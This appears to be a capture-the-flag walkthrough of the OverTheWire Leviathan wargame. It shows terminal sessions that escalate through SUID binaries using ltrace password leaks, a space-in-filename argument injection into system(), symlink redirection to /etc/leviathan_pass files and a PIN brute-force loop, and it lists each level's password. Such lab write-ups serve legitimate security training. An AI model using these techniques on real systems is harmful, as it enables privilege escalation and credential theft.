# Leviathan OverTheWire Wargame

## Level0 

After connecting to the specific level with `ssh` by typing
    *ssh leviathan0@leviathan.labs.overthewire.org -p 2223* 
with password 
    *leviathan0*

we come across a `.backup` directory owned by `leviathan1`, which is interesting
from the first sight and after inspecting its internals, one should be able to find
a `bookmarks.html` file as shown in the snippet below

    leviathan0@gibson:~$ ls -la
    total 24
    drwxr-xr-x  3 root       root       4096 Jul 17 15:57 .
    drwxr-xr-x 83 root       root       4096 Jul 17 15:59 ..
    drwxr-x---  2 leviathan1 leviathan0 4096 Jul 17 15:57 .backup
    -rw-r--r--  1 root       root        220 Mar 31 08:41 .bash_logout
    -rw-r--r--  1 root       root       3771 Mar 31 08:41 .bashrc
    -rw-r--r--  1 root       root        807 Mar 31 08:41 .profile
    leviathan0@gibson:~$ cd .backup/
    leviathan0@gibson:~/.backup$ ls -la
    total 140
    drwxr-x--- 2 leviathan1 leviathan0   4096 Jul 17 15:57 .
    drwxr-xr-x 3 root       root         4096 Jul 17 15:57 ..
    -rw-r----- 1 leviathan1 leviathan0 133259 Jul 17 15:57 bookmarks.html
    leviathan0@gibson:~/.backup$ 

After grepping for `leviathan1` strings inside this html file, we can easily retrieve 
the password for the next level.

    leviathan0@gibson:~/.backup$ cat bookmarks.html | grep "leviathan1"
    <DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is 3QJ3TgzHDq" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>

Password: **3QJ3TgzHDq**

## Level1

After connecting to the specific level with `ssh` by typing
    *ssh leviathan1@leviathan.labs.overthewire.org -p 2223* 
with password 
    *3QJ3TgzHDq*

we come across a SUID binary named `check` owned by `leviathan2`, which expects 
a password string as user input and spawns a shell when this password is correct.

    leviathan1@gibson:~$ file check 
    check: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=115df4ab9cca6c946a5c068b6c9c103f38a6e73b, for GNU/Linux 3.2.0, not stripped
    leviathan1@gibson:~$ ls -la check 
    -r-sr-x--- 1 leviathan2 leviathan1 15080 Jul 17 15:57 check
    leviathan1@gibson:~$ ./check 
    password: password 
    Wrong password, Good Bye ...

One simple way to debug this is use `ltrace` tool which basically traces all library calls
inside the binary.

    leviathan1@gibson:~$ ltrace ./check 
    __libc_start_main(0x80490ed, 1, 0xffffd394, 0 <unfinished ...>
    printf("password: ")                                                                                       = 10
    getchar(0, 0, 0x786573, 0x646f67password: password
    )                                                                          = 112
    getchar(0, 112, 0x786573, 0x646f67)                                                                        = 97
    getchar(0, 0x6170, 0x786573, 0x646f67)                                                                     = 115
    strcmp("pas", "sex")                                                                                       = -1
    puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
    )                                                                       = 29
    +++ exited (status 0) +++

As one can easily notice from the above snippet, there is a `strcmp` call which checks
for the equality of our input (only first 3 characters, `pas` in this case) with 
the string `sex`. So after rerunning the binary and providing the `sex` password, one
can spawn a shell with the privileges of `leviathan2` and easily retrieve the password
for the next level.

    leviathan1@gibson:~$ ./check 
    password: sex
    $ whoami
    leviathan2
    $ cd /etc/leviathan_pass
    $ ls -l
    total 32
    -r-------- 1 leviathan0 leviathan0 11 Jul 17 15:57 leviathan0
    -r-------- 1 leviathan1 leviathan1 11 Jul 17 15:57 leviathan1
    -r-------- 1 leviathan2 leviathan2 11 Jul 17 15:57 leviathan2
    -r-------- 1 leviathan3 leviathan3 11 Jul 17 15:57 leviathan3
    -r-------- 1 leviathan4 leviathan4 11 Jul 17 15:57 leviathan4
    -r-------- 1 leviathan5 leviathan5 11 Jul 17 15:57 leviathan5
    -r-------- 1 leviathan6 leviathan6 11 Jul 17 15:57 leviathan6
    -r-------- 1 leviathan7 leviathan7 11 Jul 17 15:57 leviathan7
    $ cat leviathan2
    NsN1HwFoyN

Password: **NsN1HwFoyN**


## Level2

After connecting to the specific level with `ssh` by typing
    *ssh leviathan2@leviathan.labs.overthewire.org -p 2223* 
with password 
    *NsN1HwFoyN*

one can come across a binary named `printfile` which prints the contents of the 
file provided as an argument to the binary when executing, as shown below.

    leviathan2@gibson:~$ ls -l
    total 16
    -r-sr-x--- 1 leviathan3 leviathan2 15068 Jul 17 15:57 printfile # [1]
    leviathan2@gibson:~$ mkdir /tmp/test123 && touch /tmp/test123/file.txt 
    leviathan2@gibson:~$ echo "lala" > /tmp/test123/file.txt
    leviathan2@gibson:~$ ./printfile /tmp/test123/file.txt 
    lala

After using `ltrace` to check what library calls are used inside this binary,
one can see an interesting function used.

    leviathan2@gibson:~$ ltrace ./printfile /tmp/test123/file.txt 
    __libc_start_main(0x80490ed, 2, 0xffffd364, 0 <unfinished ...>
    access("/tmp/test123/file.txt", 4)                                                                         = 0
    snprintf("/bin/cat /tmp/test123/file.txt", 511, "/bin/cat %s", "/tmp/test123/file.txt")                    = 30
    geteuid()                                                                                                  = 12002
    geteuid()                                                                                                  = 12002
    setreuid(12002, 12002)                                                                                     = 0
    system("/bin/cat /tmp/test123/file.txt"lala
    <no return ...>
    --- SIGCHLD (Child exited) ---
    <... system resumed> )                                                                                     = 0
    +++ exited (status 0) +++

`access()` function call checks whether the calling process can access the file
pathname or not. But, the interesting part is that at [1] the binary's owner is
`leviathan3`. Also, `/bin/cat` is used to print the contents of the file provided,
so if we specify to `printfile` an argument file with spaces in its name, then 
`/bin/cat` will think that the argument has 2 files.

After creating a dynamic link for the password, dereferenced by the second part of
the file name provided to the binary, 

    leviathan2@gibson:/tmp/test123$ ls -l
    total 4
    -rw-rw-r-- 1 leviathan2 leviathan2 5 Jul 22 11:18 file.txt
    leviathan2@gibson:/tmp/test123$ touch file.txt\ exploit
    leviathan2@gibson:/tmp/test123$ ls -la
    total 19096
    drwxrwxr-x    2 leviathan2 leviathan2     4096 Jul 22 11:28 .
    drwxrwx-wt 1022 root       root       19537920 Jul 22 11:28 ..
    -rw-rw-r--    1 leviathan2 leviathan2        5 Jul 22 11:18 file.txt
    -rw-rw-r--    1 leviathan2 leviathan2        0 Jul 22 11:28 file.txt exploit
    leviathan2@gibson:/tmp/test123$ ln -s /etc/leviathan_pass/leviathan3 /tmp/test123/exploit

and rerunning the script with argument to be the file with spaces in its name, 

    leviathan2@gibson:/tmp/test123$ ~/printfile "file.txt exploit"
    lala
    f0n8h2iWLP

one can easily leak the password for the next level and continue with the challenges.

Password: **f0n8h2iWLP**


## Level3

After connecting to the specific level with `ssh` by typing
    *ssh leviathan3@leviathan.labs.overthewire.org -p 2223* 
with password 
    *f0n8h2iWLP*

one can come across a binary named `level3` which as it seems is very similar to
level1. A password check is being made and after quickly running `ltrace`, we can
leak the password our input is being check against and spawn a shell the `leviathan4`
privileges.

    leviathan3@gibson:~$ ltrace ./level3 
    __libc_start_main(0x80490ed, 1, 0xffffd384, 0 <unfinished ...>
    strcmp("h0no33", "kakaka")                                                                = -1
    printf("Enter the password> ")                                                            = 20
    fgets(Enter the password> lalala 
    "lalala\n", 256, 0xf7fae5c0)                                                        = 0xffffd15c
    strcmp("lalala\n", "snlprintf\n")                                                         = -1
    puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
    )                                                                = 19
    +++ exited (status 0) +++
    leviathan3@gibson:~$ ./level3 
    Enter the password> snlprintf
    [You've got shell]!
    $ id
    uid=12004(leviathan4) gid=12003(leviathan3) groups=12003(leviathan3)
    $ cat /etc/leviathan_pass/leviathan4
    WG1egElCvO

Password: **WG1egElCvO**


## Level4

After connecting to the specific level with `ssh` by typing
    *ssh leviathan4@leviathan.labs.overthewire.org -p 2223* 
with password 
    *WG1egElCvO*

one can see a `trash` hidden directory that contains a `bin` binary owned by root.
After running it, one can see some binary stuff outputed to the console. But `ltrace`
gives us a hint about what this binary output actually represent.

    leviathan4@gibson:~$ ls -la
    total 24
    drwxr-xr-x  3 root root       4096 Jul 17 15:57 .
    drwxr-xr-x 83 root root       4096 Jul 17 15:59 ..
    -rw-r--r--  1 root root        220 Mar 31 08:41 .bash_logout
    -rw-r--r--  1 root root       3771 Mar 31 08:41 .bashrc
    -rw-r--r--  1 root root        807 Mar 31 08:41 .profile
    dr-xr-x---  2 root leviathan4 4096 Jul 17 15:57 .trash
    leviathan4@gibson:~$ cd .trash/
    leviathan4@gibson:~/.trash$ ls
    bin
    leviathan4@gibson:~/.trash$ ./bin 
    00110000 01100100 01111001 01111000 01010100 00110111 01000110 00110100 01010001 01000100 00001010 
    leviathan4@gibson:~/.trash$ ltrace ./bin 
    __libc_start_main(0x80490ad, 1, 0xffffd374, 0 <unfinished ...>
    fopen("/etc/leviathan_pass/leviathan5", "r")                                              = 0
    +++ exited (status 255) +++

After c/p the binary to [REF1], one can easily get the password for the next level/

Password: **0dyxT7F4QD**


## Level5

After connecting to the specific level with `ssh` by typing
    *ssh leviathan5@leviathan.labs.overthewire.org -p 2223* 
with password 
    *0dyxT7F4QD*

one can come across a `leviathan5` binary which looks for a `/tmp/file.log` file
and prints its contents. After creating a symbolic link to our file of interest with 

    ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log

we can easily leak the next level's password after rerunning the binary.

    leviathan5@gibson:~$ ./leviathan5 
    Cannot find /tmp/file.log
    leviathan5@gibson:~$ touch /tmp/file.log
    leviathan5@gibson:~$ ./leviathan5 
    leviathan5@gibson:~$ ltrace ./leviathan5 
    __libc_start_main(0x804910d, 1, 0xffffd384, 0 <unfinished ...>
    fopen("/tmp/file.log", "r")                                                               = 0
    puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
    )                                                         = 26
    exit(-1 <no return ...>
    +++ exited (status 255) +++
    leviathan5@gibson:~$ echo "lala" > /tmp/file.log
    leviathan5@gibson:~$ ./leviathan5 
    lala
    leviathan5@gibson:~$ ltrace ./leviathan5 
    __libc_start_main(0x804910d, 1, 0xffffd384, 0 <unfinished ...>
    fopen("/tmp/file.log", "r")                                                               = 0
    puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
    )                                                         = 26
    exit(-1 <no return ...>
    +++ exited (status 255) +++
    leviathan5@gibson:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log 
    leviathan5@gibson:~$ ./leviathan5 
    szo7HDB88w

Password: **szo7HDB88w**


## Level6

After connecting to the specific level with `ssh` by typing
    *ssh leviathan6@leviathan.labs.overthewire.org -p 2223* 
with password 
    *szo7HDB88w*

one can find a binary expecting a 4 digit number as an argument and spawning a 
shell with `leviathan7` privileges if given number is correct. A quick and straight-
forward solution is to create a simple bruteforcing script under `/tmp/` which looks
like this: 

    for i in {0000..9999}
    do
	    echo "Checking $i"
	    ~/leviathan6 $i
    done

After running it, it seems that digit code `7123` is the correct one. Thus, a shell is 
spawned and one can easily retrieve the password for the next level.

    leviathan6@gibson:~$ . /tmp/brute.sh
    Checking 0000
    Wrong
    ...
    ...
    ...
    Checking 6771
    Wrong
    Checking 6772
    Wrong
    Checking 6773
    Wrong
    Checking 6774
    Wrong
    Checking 6775
    Wrong
    Checking 6776
    Wrong
    Checking 6777
    Wrong
    Checking 6778
    Wrong
    Checking 6779
    Wrong
    ...
    ...
    ...
    Checking 7122
    Wrong
    Checking 7123
    $ id     
    uid=12007(leviathan7) gid=12006(leviathan6) groups=12006(leviathan6)
    $ cat /etc/leviathan_pass/leviathan7 
    qEs5Io5yM8

Password: **qEs5Io5yM8**


## Level7

After connecting to the specific level with `ssh` by typing
    *ssh leviathan7@leviathan.labs.overthewire.org -p 2223* 
with password 
    *qEs5Io5yM8*

one can see a *CONGRATULATIONS* file message, which means we completed the wargame
successfully. 



## References

[REF1]: https://www.rapidtables.com/convert/number/binary-to-string.html
